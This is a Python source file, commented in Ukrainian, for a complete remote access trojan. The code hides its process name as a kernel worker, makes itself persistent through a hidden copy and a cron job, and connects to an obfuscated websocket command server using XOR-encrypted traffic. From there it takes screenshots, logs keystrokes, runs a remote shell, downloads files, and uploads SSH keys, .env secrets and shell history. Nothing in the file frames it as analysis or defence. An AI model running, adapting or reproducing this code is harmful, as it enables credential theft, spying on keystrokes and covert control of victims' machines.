import asyncio
import websockets
import os
import subprocess
import uuid
import base64
import sys
import shutil
import glob
from io import BytesIO

# Спроба маскування
try: import setproctitle
except: setproctitle = None
try: from PIL import ImageGrab
except: ImageGrab = None
try: from pynput import keyboard
except: keyboard = None

# Налаштування
_S = "d3M6Ly8xOTIuMTY4LjEwLjgyOjgwMDAvd3Mv" 
X_KEY = "AMY_2026_SECRET"
FAKE_NAME = "[kworker/u2:1-events]"
log_buffer = []

# Поточна робоча директорія для Shell
current_dir = os.getcwd()

def get_url(): return base64.b64decode(_S).decode()

def crypt_logic(d):
    k = X_KEY
    return "".join(chr(ord(d[i]) ^ ord(k[i % len(k)])) for i in range(len(d)))

def decrypt(m):
    try: return crypt_logic(base64.b64decode(m).decode())
    except: return None

def encrypt(m): return base64.b64encode(crypt_logic(m).encode()).decode()

def masquerade():
    if setproctitle: setproctitle.setproctitle(FAKE_NAME)
    else:
        try:
            import ctypes
            libc = ctypes.CDLL('libc.so.6')
            libc.prctl(15, FAKE_NAME.encode(), 0, 0, 0)
        except: pass

def ghost_install():
    try:
        target_dir = os.path.expanduser("~/.local/share/systemd-service")
        target_path = os.path.join(target_dir, "sys-update")
        current_path = os.path.abspath(sys.argv[0])
        if current_path != target_path:
            os.makedirs(target_dir, exist_ok=True)
            shutil.copy2(current_path, target_path)
            os.chmod(target_path, 0o755)
            cron_cmd = f"*/2 * * * * {target_path} > /dev/null 2>&1"
            current_cron = subprocess.run("crontab -l", shell=True, capture_output=True, text=True).stdout
            if target_path not in current_cron:
                new_cron = current_cron + f"\n{cron_cmd}\n"
                subprocess.Popen("crontab -", stdin=subprocess.PIPE, shell=True).communicate(input=new_cron.encode())
            subprocess.Popen([target_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            sys.exit(0)
    except: pass

async def steal_mode(ws):
    home = os.path.expanduser("~")
    data_targets = [
        ("ssh", os.path.join(home, ".ssh", "*")),
        ("env", os.path.join(home, "**", ".env")),
        ("history", os.path.join(home, ".bash_history"))
    ]
    stolen_count = 0
    for data_type, search_path in data_targets:
        files = glob.glob(search_path, recursive=True)
        for fpath in files:
            if os.path.isfile(fpath) and os.access(fpath, os.R_OK):
                try:
                    if os.path.getsize(fpath) < 1000000:
                        with open(fpath, "rb") as f:
                            b64 = base64.b64encode(f.read()).decode()
                            await ws.send(encrypt(f"STEAL_DATA:{data_type}:{os.path.basename(fpath)}:{b64}"))
                            stolen_count += 1
                            await asyncio.sleep(0.2)
                except: pass
    return stolen_count

def on_press(key):
    global log_buffer
    try: k = str(key.char)
    except: k = f" [{str(key)}] "
    log_buffer.append(k)

if keyboard:
    try: keyboard.Listener(on_press=on_press).start()
    except: pass

async def run_shell(command):
    """Виконує команду та зберігає стан робочої директорії"""
    global current_dir
    try:
        # Спеціальна обробка команди cd
        if command.startswith("cd "):
            new_path = command[3:].strip()
            # Обробка шляху відносно поточної директорії
            potential_path = os.path.join(current_dir, new_path)
            if os.path.isdir(potential_path):
                current_dir = os.path.abspath(potential_path)
            elif os.path.isdir(new_path):
                current_dir = os.path.abspath(new_path)
            else:
                return f"cd: no such file or directory: {new_path}"
            return f"Changed directory to: {current_dir}"

        # Виконання інших команд
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=current_dir
        )
        stdout, stderr = await process.communicate()
        result = stdout.decode().strip() or stderr.decode().strip()
        
        # Додаємо маркер поточної директорії для зручності
        user_info = f"\n[{os.getlogin()}@{uuid.getnode()}:{current_dir}]$ "
        return result + user_info
    except Exception as e:
        return f"Shell Error: {str(e)}"

async def start():
    masquerade()
    ghost_install()
    b_id = f"bot_{hex(uuid.getnode())[2:10]}"
    
    while True:
        try:
            async with websockets.connect(get_url() + b_id) as ws:
                while True:
                    m = await ws.recv()
                    cmd = decrypt(m)
                    if not cmd: continue
                    cmd = cmd.strip()
                    
                    if cmd == "screenshot":
                        if ImageGrab:
                            buf = BytesIO()
                            ImageGrab.grab().save(buf, format="PNG")
                            await ws.send(encrypt(f"SCREENSHOT:{base64.b64encode(buf.getvalue()).decode()}"))
                        else: await ws.send(encrypt("Error: No ImageGrab"))
                    
                    elif cmd == "steal":
                        await ws.send(encrypt("SYS_MSG: Stealer initiated..."))
                        count = await steal_mode(ws)
                        await ws.send(encrypt(f"SYS_MSG: Stealer finished. Total: {count}"))
                    
                    elif cmd == "get_keys":
                        global log_buffer
                        await ws.send(encrypt("KEYLOG:" + "".join(log_buffer)))
                        log_buffer = []
                    
                    elif cmd.startswith("download "):
                        path = cmd[9:].strip()
                        abs_path = os.path.join(current_dir, path) if not os.path.isabs(path) else path
                        if os.path.exists(abs_path) and os.path.isfile(abs_path):
                            with open(abs_path, "rb") as f:
                                b64 = base64.b64encode(f.read()).decode()
                                await ws.send(encrypt(f"FILE_DATA:{os.path.basename(abs_path)}:{b64}"))
                        else: await ws.send(encrypt("Error: File not found"))
                    
                    elif cmd == "self_destruct":
                        subprocess.run("crontab -r", shell=True)
                        os.remove(os.path.abspath(sys.argv[0]))
                        os._exit(0)

                    else:
                        # Все інше йде в інтерактивний Shell
                        response = await run_shell(cmd)
                        await ws.send(encrypt(response))
        except: await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(start())

